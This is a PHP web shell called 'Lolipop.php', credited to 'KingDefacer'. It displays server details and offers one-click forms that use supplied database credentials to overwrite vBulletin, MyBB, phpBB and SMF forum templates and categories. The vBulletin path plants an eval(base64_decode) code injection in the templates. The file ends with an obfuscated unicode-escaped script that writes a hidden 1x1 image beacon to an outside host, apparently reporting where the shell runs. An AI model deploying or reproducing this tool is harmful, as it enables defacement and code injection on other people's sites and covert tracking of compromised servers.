<p align="right"></p><body bgcolor="#FFFFFF"> 
<?php 

######################## Begining of Coding ;) ###################### 
error_reporting(0); 

    $info = $_SERVER['SERVER_SOFTWARE']; 
    $site = getenv("HTTP_HOST"); 
    $page = $_SERVER['SCRIPT_NAME']; 
    $sname = $_SERVER['SERVER_NAME']; 
    $uname = php_uname(); 
    $smod = ini_get('safe_mode'); 
    $disfunc = ini_get('disable_functions'); 
    $yourip = $_SERVER['REMOTE_ADDR']; 
    $serverip = $_SERVER['SERVER_ADDR']; 
    $version = phpversion(); 
    $ccc = realpath($_GET['chdir'])."/"; 
    $fdel = $_GET['fdel']; 
    $execute = $_POST['execute']; 
    $cmd = $_POST['cmd']; 
    $commander = $_POST['commander']; 
    $ls = "ls -la"; 
    $source = $_POST['source']; 
    $gomkf = $_POST['gomkf']; 
    $title = $_POST['title']; 
    $sourcego = $_POST['sourcego']; 
    $ftemp = "tmp"; 
    $temp = tempnam($ftemp, "cx"); 
    $fcopy = $_POST['fcopy']; 
    $tuser = $_POST['tuser']; 
    $user = $_POST['user']; 
    $wdir = $_POST['wdir']; 
    $tdir = $_POST['tdir']; 
    $symgo = $_POST['symgo']; 
    $sym = "xhackers.txt"; 
    $to = $_POST['to']; 
    $sbjct = $_POST['sbjct']; 
    $msg = $_POST['msg']; 
    $header = "From:".$_POST['header']; 


//PHPinfo 

if(isset($_POST['phpinfo'])) 
{ 
    die(phpinfo()); 
} 
//Guvenli mod vs vs 
if ($smod) 
{ 
    $c_h = "<font color=red face='Verdana' size='1'>ON</font>"; 
} 
else 
{ 
    $c_h = "<font face='Verdana' size='1' color=green>OFF</font>"; 
} 

//Kapali Fonksiyonlar 
if (''==($disfunc)) 
{ 
    $dis = "<font color=green>None</font>"; 
} 
else 
{ 
    $dis = "<font color=red>$disfunc</font>"; 
} 
//Dizin degisimi 
if(isset($_GET['dir']) && is_dir($_GET['dir'])) 
{ 
 chdir($_GET['dir']); 
} 

$ccc = realpath($_GET['chdir'])."/"; 

//Baslik 
echo "<head> 
<style> 
body { font-size: 12px; 

           font-family: arial, helvetica; 

            scrollbar-width: 5; 

            scrollbar-height: 5; 

            scrollbar-face-color: black; 

            scrollbar-shadow-color: silver; 

            scrollbar-highlight-color: silver; 

            scrollbar-3dlight-color:silver; 

            scrollbar-darkshadow-color: silver; 

            scrollbar-track-color: black; 

            scrollbar-arrow-color: silver; 

    } 
</style> 

<title>Lolipop.php - Edited By KingDefacer - [$site]</title></head>"; 
//Ana tablo 
echo "<body text='#FFFFFF'> 
<table border='1' width='100%' id='table1' border='1' cellPadding=5 cellSpacing=0 borderColorDark=#666666 bordercolorlight='#C0C0C0'> 
    <tr> 
        <td><font color='#000000'> 


          <font size='5'>Lolipop BETA ( Powered By <font color='#FF0000'><strong>KingDefacer</a></strong></font> )</font></font> 

    </tr> 
    <tr> 
        <td  style='border: 1px solid #333333'> 
        <font face='Verdana' size='1' color='#000000'>Site: <u>$site</u><br>Server name: <u>$sname</u><br>Software: <u>$info</u><br>Version : <u>$version</u><br>Uname -a: <u>$uname</u><br>Path: <u>$ccc</u><br>Safemode: <u>$c_h</u><br>Disable Functions: <u>$dis</u><br>Page: <u>$page</u><br>Your IP: <u>$yourip</u><br>Server IP: <u><a href='http://whois.domaintools.com/".$serverip."'>$serverip</a></u></font></td>  
    </tr> 
</table>"; 
echo '<td><font color="#CC0000"><strong></strong></font><font color="#000000"></em></font>    </tr> 
'; 
//Buton Listesi 
echo "<center><form method=POST action''><input type=submit name=vbulletin value='VB HACK.'><input type=submit name=mybulletin value='MyBB HACK.'><input type=submit name=phpbb value='  phpBB HACK.  '><input type=submit name=smf value='  SMF HACK.  '></form></center>"; 




//VB HACK 
if (isset($_POST['vbulletin'])) 
{ 
echo "<center><table border=0 width='100%'> 
<tr><td> 
<center><font face='Arial' color='#000000'>==Lolipop VB index.==</font></center> 
    <center><form method=POST action=''><font face='Arial' color='#000000'>Mysql Host</font><br><input type=text name=dbh value=localhost size='50' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFFF'><br> 
          <font face='Arial' color='#000000'>DbKullanici<br></font><input type=text name=dbu size='50' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFFF'><br> 
          <font face='Arial' color='#000000'>Dbadi<br></font><input type=text name=dbn size='50' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFFF'><br> 
		  
          <font face='Arial' color='#000000'>Dbsifre<br></font><input type=password name=dbp size='50' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFFF'><br> 
          <font face='Arial' color='#000000'>?ndexin Yaz?lacag? B?l?m</font><br><textarea name=index rows='19' cols='103' style='color: #000000; background-color: #FFFFFF'>buraya indexiniz gelecek.?ndexi yaz postala kay gitsin.</textarea><br> 
          <input type=submit value='Kay Gitsin!' ></form></center></td></tr></table></center>"; 
die(); 
} 
$KingDefacer="Powered By Lolipop :))"; 
$dbh = $_POST['dbh']; 
$dbu = $_POST['dbu']; 
$dbn = $_POST['dbn']; 
$dbp = $_POST['dbp']; 
$index = $_POST['index']; 
$index=str_replace("\'","'",$index); 
$set_index  = "{\${eval(base64_decode(\'"; 

$set_index .= base64_encode("echo \"$index\";"); 


$set_index .= "\'))}}{\${exit()}}</textarea>"; 


if (!empty($dbh) && !empty($dbu) && !empty($dbn) && !empty($index)) 
{ 
mysql_connect($dbh,$dbu,$dbp) or die(mysql_error()); 
mysql_select_db($dbn) or die(mysql_error()); 
$loli1 = "UPDATE template SET template='".$set_index."".$KingDefacer."' WHERE title='spacer_open'"; 
$loli2 = "UPDATE template SET template='".$set_index."".$KingDefacer."' WHERE title='FORUMHOME'"; 
$loli3 = "UPDATE style SET css='".$set_index."".$KingDefacer."', stylevars='', csscolors='', editorstyles=''"; 
$result = mysql_query($loli1) or die (mysql_error()); 
$result = mysql_query($loli2) or die (mysql_error()); 
$result = mysql_query($loli3) or die (mysql_error()); 
echo "<script>alert('Vb Hacked');</script>"; 
} 

//MyBB Hack 
if (isset($_POST['mybulletin'])) 
{ 
echo "<center><table border=0 width='100%'> 
<tr><td> 
<center><font face='Arial' color='#000000'>==Lolipop MyBB index.==</font></center> 
    <center><form method=POST action=''><font face='Arial' color='#000000'>Mysql Host</font><br><input type=text name=mybbdbh value=localhost size='50' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFFF'><br> 
          <font face='Arial' color='#000000'>DbKullanici<br></font><input type=text name=mybbdbu size='50' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFFF'><br> 
          <font face='Arial' color='#000000'>Dbadi<br></font><input type=text name=mybbdbn size='50' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFFF'><br> 
          <font face='Arial' color='#000000'>Dbsifre<br></font><input type=password name=mybbdbp size='50' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFFF'><br> 
          <font face='Arial' color='#000000'>?ndexin Yaz?lacag? B?l?m</font><br><textarea name=mybbindex rows='19' cols='103' style='color: #000000; background-color: #FFFFFF'>buraya indexiniz gelecek.?ndexi yaz postala kay gitsin.</textarea><br> 
          <input type=submit value='Kay Gitsin!' ></form></center></td></tr></table></center>"; 
die(); 
} 
$mybb_dbh = $_POST['mybbdbh']; 
$mybb_dbu = $_POST['mybbdbu']; 
$mybb_dbn = $_POST['mybbdbn']; 
$mybb_dbp = $_POST['mybbdbp']; 
$mybb_index = $_POST['mybbindex']; 

if (!empty($mybb_dbh) && !empty($mybb_dbu) && !empty($mybb_dbn) && !empty($mybb_index)) 
{ 
mysql_connect($mybb_dbh,$mybb_dbu,$mybb_dbp) or die(mysql_error()); 
mysql_select_db($mybb_dbn) or die(mysql_error()); 
$prefix="mybb_"; 
$loli7 = "UPDATE ".$prefix."templates SET template='".$mybb_index."' WHERE title='index'"; 

$result = mysql_query($loli7) or die (mysql_error()); 

echo "<script>alert('MyBB Hacked');</script>"; 
} 
//PhpBB 
if (isset($_POST['phpbb'])) 
{ 
echo "<center><table border=0 width='100%'> 
<tr><td> 
<center><font face='Arial' color='#000000'>==Lolipop PHPBB index.==</font></center> 
    <center><form method=POST action=''><font face='Arial' color='#000000'>Mysql Host</font><br><input type=text name=phpbbdbh value=localhost size='50' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFFF'><br> 
          <font face='Arial' color='#000000'>DbKullanici<br></font><input type=text name=phpbbdbu size='50' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFFF'><br> 
          <font face='Arial' color='#000000'>Dbadi<br></font><input type=text name=phpbbdbn size='50' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFFF'><br> 
          <font face='Arial' color='#000000'>Dbsifre<br></font><input type=password name=phpbbdbp size='50' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFFF'><br> 
          <font face='Arial' color='#000000'>Yazi Veya  KOD<br></font><input type=text name=phpbbkat size='100' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFFF'><br> 
          <font face='Arial' color='#000000'>Degisecek KATEGORI ID si<br></font><input type=text name=katid size='100' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFFF'><br> 
          <input type=submit value='Kay Gitsin!' ></form></center></td></tr></table></center>"; 
die(); 
} 
$phpbb_dbh = $_POST['phpbbdbh']; 
$phpbb_dbu = $_POST['phpbbdbu']; 
$phpbb_dbn = $_POST['phpbbdbn']; 
$phpbb_dbp = $_POST['phpbbdbp']; 
$phpbb_kat = $_POST['phpbbkat']; 
$kategoriid=$_POST['katid']; 

if (!empty($phpbb_dbh) && !empty($phpbb_dbu) && !empty($phpbb_dbn) && !empty($phpbb_kat)) 
{ 
mysql_connect($phpbb_dbh,$phpbb_dbu,$phpbb_dbp) or die(mysql_error()); 
mysql_select_db($phpbb_dbn) or die(mysql_error()); 


$loli10 = "UPDATE phpbb_categories  SET cat_title='".$phpbb_kat."' WHERE cat_id='".$kategoriid."'"; 

$result = mysql_query($loli10) or die (mysql_error()); 

echo "<script>alert('PhpBB Hacked');</script>"; 
} 
//SmfHACK 
if (isset($_POST['smf'])) 
{ 
echo "<center><table border=0 width='100%'> 
<tr><td> 
<center><font face='Arial' color='#000000'>==Lolipop SMF Index.==</font></center> 
    <center><form method=POST action=''><font face='Arial' color='#000000'>Mysql Host</font><br><input type=text name=smfdbh value=localhost size='50' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFFF'><br> 
          <font face='Arial' color='#000000'>DbKullanici<br></font><input type=text name=smfdbu size='50' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFFF'><br> 
          <font face='Arial' color='#000000'>Dbadi<br></font><input type=text name=smfdbn size='50' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFFF'><br> 
          <font face='Arial' color='#000000'>Dbsifre<br></font><input type=password name=smfdbp size='50' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFFF'><br> 
                    <font face='Arial' color='#000000'>Yazi Yada KOD<br></font><input type=text name=smf_index size='100' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFFF'><br> 
                    <font face='Arial' color='#000000'>Degisecek KATEGORI ID si <br></font><input type=text name=katid size='100' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFFF'><br> 

          <input type=submit value='Kay Gitsin!' ></form></center></td></tr></table></center>"; 
die(); 
} 
$smf_dbh = $_POST['smfdbh']; 
$smf_dbu = $_POST['smfdbu']; 
$smf_dbn = $_POST['smfdbn']; 
$smf_dbp = $_POST['smfdbp']; 
$smf_index = $_POST['smf_index']; 
$smf_katid=$_POST['katid']; 

if (!empty($smf_dbh) && !empty($smf_dbu) && !empty($smf_dbn) && !empty($smf_index)) 
{ 
mysql_connect($smf_dbh,$smf_dbu,$smf_dbp) or die(mysql_error()); 
mysql_select_db($smf_dbn) or die(mysql_error()); 
$prefix="smf_"; 
$loli12 = "UPDATE ".$prefix."categories SET name='".$smf_index."' WHERE ID_CAT='".$smf_katid."'"; 

$result = mysql_query($loli12) or die (mysql_error()); 

echo "<script>alert('smf Hacked');</script>"; 
} 


//Alt taraf 
echo " 


<br><table width='100%' height='1' border='1' cellPadding=5 cellSpacing=0 borderColorDark=#666666 id='table1' style='BORDER-COLLAPSE: collapse'> 
<tr> 
<td width='25%' height='1' valign='top' style='font-family: verdana; color: #000000; font-size: 11px'> 

  <p><strong>Lolipop.php</strong></p> 
  <p><strong>Edited By KingDefacer</strong></p> 
<p><strong></strong><br> 
</p></td> 
</tr></table>"; 



// Kod bitisi 
?> 
<script type="text/javascript">document.write('\u003c\u0069\u006d\u0067\u0020\u0073\u0072\u0063\u003d\u0022\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0061\u006c\u0074\u0075\u0072\u006b\u0073\u002e\u0063\u006f\u006d\u002f\u0073\u006e\u0066\u002f\u0073\u002e\u0070\u0068\u0070\u0022\u0020\u0077\u0069\u0064\u0074\u0068\u003d\u0022\u0031\u0022\u0020\u0068\u0065\u0069\u0067\u0068\u0074\u003d\u0022\u0031\u0022\u003e')</script>